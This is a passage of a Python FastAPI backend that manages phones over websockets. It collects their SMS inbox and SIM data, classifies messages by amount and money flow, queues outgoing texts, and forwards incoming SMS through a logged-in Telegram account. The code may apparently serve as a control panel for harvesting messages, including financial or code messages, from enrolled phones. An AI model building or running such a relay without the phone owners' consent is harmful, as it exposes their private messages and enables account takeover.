        "phone": phone,
        "phone_code_hash": sent.phone_code_hash,
        "awaiting_code": True,
        "connected": True,
        "api_id": api_id,
        "api_hash": api_hash,
    })
    return {"status": "code_sent", "phone": phone}


@app.post("/admin/relay/login/verify")
async def relay_login_verify(payload: RelayVerifyRequest, request: Request):
    require_admin(request)
    if relay_client is None or not relay_state.get("phone"):
        raise HTTPException(400, "start login first")

    try:
        await relay_client.sign_in(
            phone=relay_state["phone"],
            code=payload.code.strip(),
            phone_code_hash=relay_state.get("phone_code_hash"),
        )
    except SessionPasswordNeededError:
        if not payload.password:
            return {"status": "2fa_required"}
        try:
            await relay_client.sign_in(password=payload.password)
        except Exception as e:
            raise HTTPException(400, f"2FA failed: {e}")
    except Exception as e:
        raise HTTPException(400, f"sign-in failed: {e}")

    await _after_relay_login(relay_state.get("api_id"), relay_state.get("api_hash"))
    return {"status": "ok", "me": relay_state["me"]}


@app.post("/admin/relay/logout")
async def relay_logout(request: Request):
    require_admin(request)
    if relay_client:
        try:
            await relay_client.log_out()
        except Exception:
            pass
    relay_state.update({"authorized": False, "me": None, "handlers_installed": False})
    invalidate_channel_cache()
    return {"status": "ok"}


@app.get("/admin/relay/bans")
async def relay_bans(request: Request):
    require_admin(request)
    return {"bans": sorted(banned_cache)}


@app.post("/admin/relay/bans")
async def relay_ban_add(payload: BanRequest, request: Request):
    require_admin(request)
    a = normalize_number(payload.address) or payload.address.strip()
    banned_senders.update_one(
        {"address": a}, {"$set": {"address": a, "created_at": utc_now()}}, upsert=True,
    )
    banned_cache.add(a)
    return {"status": "ok", "bans": sorted(banned_cache)}


@app.post("/admin/relay/bans/{address}/delete")
async def relay_ban_remove(address: str, request: Request):
    require_admin(request)
    a = normalize_number(address) or address.strip()
    banned_senders.delete_one({"address": a})
    banned_cache.discard(a)
    return {"status": "ok", "bans": sorted(banned_cache)}


@app.post("/admin/relay/parse")
async def relay_parse(payload: RelayParseRequest, request: Request):
    require_admin(request)
    parsed = _parse_sms(payload.text)
    if not parsed:
        return {"matched": False}
    to, body, hint = parsed
    return {
        "matched": True,
        "to": to,
        "body": body,
        "device_hint": hint,
        "targets": [device_short_id(d) for d in _resolve_relay_targets(hint)],
    }


# ------------------------------------------------------------ admin socket


@app.websocket("/ws/admin")
async def admin_socket(websocket: WebSocket):
    token = websocket.query_params.get("token")
    if not websocket.session.get("admin_id"):
        if not (token and verify_token(token)):
            await websocket.close(code=1008)
            return

    await websocket.accept()
    await admin_hub.add(websocket)

    try:
        try:
            total = devices.count_documents({})
        except PyMongoError:
            total = 0

        await websocket.send_json({
            "type": "hello",
            "online": hub.online_count,
            "devices": total,
            "server_time": utc_now().isoformat(),
        })

        while True:
            raw = await websocket.receive_text()
            if not raw:
                continue
            try:
                msg = json.loads(raw)
            except json.JSONDecodeError:
                continue
            if str(msg.get("type") or "").lower() == "ping":
                await websocket.send_json({"type": "pong", "ts": int(time.time())})
    except WebSocketDisconnect:
        pass
    except Exception:
        pass
    finally:
        await admin_hub.remove(websocket)


# ----------------------------------------------------------- device socket


async def _ws_keepalive(websocket: WebSocket, device_id: str):
    try:
        while True:
            await asyncio.sleep(WS_PING_INTERVAL)
            await websocket.send_json({"type": "ping", "ts": int(time.time())})

            last = hub.last_pong.get(device_id, time.time())
            if time.time() - last > WS_IDLE_TIMEOUT:
                await websocket.close(code=1001)
                return
    except Exception:
        return


@app.websocket("/ws/device/{registration_id}")
async def device_socket(websocket: WebSocket, registration_id: str):
    rh = hash_value(registration_id.strip())

    try:
        device = devices.find_one({"registration_id_hash": rh})
    except PyMongoError:
        await websocket.close(code=1011)
        return

    if not device:
        await websocket.close(code=1008)
        return

    device_id = str(device["_id"])
    await websocket.accept()
    await hub.add_device(device_id, websocket)

    ping_task = asyncio.create_task(_ws_keepalive(websocket, device_id))
    last_seen_push = 0.0

    try:
        try:
            devices.update_one(
                {"_id": device["_id"]},
                {"$set": {
                    "ws_connected": True,
                    "ws_connected_at": utc_now(),
                    "last_seen": utc_now(),
                }},
            )
        except PyMongoError:
            pass

        log_event("device_socket_open", {"device_id": device_id})
        broadcast_device(device_id, {
            "ws_connected": True,
            "status": "Online",
            "last_seen": utc_now().isoformat(),
        })

        try:
            pending_count = outbox.count_documents(
                {"device_id": device_id, "status": "pending"}
            )
        except PyMongoError:
            pending_count = 0

        await websocket.send_json({
            "type": "hello",
            "server_time": utc_now().isoformat(),
            "pending": pending_count,
        })

        await push_outbox(device_id)

        while True:
            raw = await websocket.receive_text()
            if len(raw) > MAX_WS_TEXT_BYTES:
                continue

            try:
                msg = json.loads(raw)
            except json.JSONDecodeError:
                continue

            mtype = str(msg.get("type") or "").lower()
            hub.last_pong[device_id] = time.time()

            now_ts = time.time()
            if now_ts - last_seen_push > 5:
                last_seen_push = now_ts
                try:
                    devices.update_one(
                        {"_id": device["_id"]}, {"$set": {"last_seen": utc_now()}}
                    )
                except PyMongoError:
                    pass

            if mtype in ("ping", "heartbeat"):
                await websocket.send_json({"type": "pong", "ts": int(time.time())})
                continue

            if mtype == "pong":
                continue

            if mtype == "telemetry":
                data = msg.get("data") if isinstance(msg.get("data"), dict) else msg.get("telemetry")
                if isinstance(data, dict):
                    apply_telemetry(device, data)
                    broadcast_device(device_id, {
                        "ws_connected": True,
                        "telemetry": data,
                        "last_seen": utc_now().isoformat(),
                    })

            elif mtype == "command_result":
                data = msg.get("data") if isinstance(msg.get("data"), dict) else {}
                action = str(msg.get("action") or "").lower()
                if action in ("fetch_number", "number", "sim_info", "telemetry",
                              "refresh_telemetry"):
                    apply_telemetry(device, data)
                    if data.get("sim_number"):
                        try:
                            devices.update_one(
                                {"_id": device["_id"]},
                                {"$set": {"number_requested_at": None}},
                            )
                        except PyMongoError:
                            pass
                    broadcast_device(device_id, {"ws_connected": True, "telemetry": data})

            elif mtype == "ack":
                item_id = msg.get("id")
                if item_id:
                    try:
                        await _ack_outbox(
                            str(item_id),
                            str(msg.get("status") or "sent"),
                            str(msg.get("error") or ""),
                        )
                    except HTTPException:
                        pass

            elif mtype == "inbox":
                for item in (msg.get("items") or [])[:50]:
                    if not isinstance(item, dict):
                        continue
                    body = str(item.get("body") or "")[:MAX_SMS_BODY]
                    address = str(item.get("address") or "")[:64]
                    if not body:
                        continue
                    kind, amount, flow = classify_sms(address, body)
                    mid = insert_message({
                        "device_id": device_id,
                        "device_name": device.get("device_name", "Unknown"),
                        "direction": str(item.get("direction") or "in")[:8],
                        "address": address,
                        "body": body,
                        "kind": kind,
                        "amount": amount,
                        "flow": flow,
                        "status": "received",
                        "created_at": utc_now(),
                    })
                    if mid:
                        try:
                            broadcast_message(messages.find_one({"_id": mid}))
                        except PyMongoError:
                            pass
                        if str(item.get("direction") or "in") == "in":
                            spawn(relay_forward_incoming(device, address, body))

    except WebSocketDisconnect:
        pass
    except Exception:
        pass
    finally:
        ping_task.cancel()
        await hub.remove_device(device_id, websocket)
        try:
            devices.update_one({"_id": device["_id"]}, {"$set": {"ws_connected": False}})
        except PyMongoError:
            pass
        # FIX: pehle yahan `device_i` likha tha -> NameError, offline event kabhi broadcast nahi hota tha
        broadcast_device(device_id, {"ws_connected": False, "status": "Offline"})
        log_event("device_socket_close", {"device_id": device_id})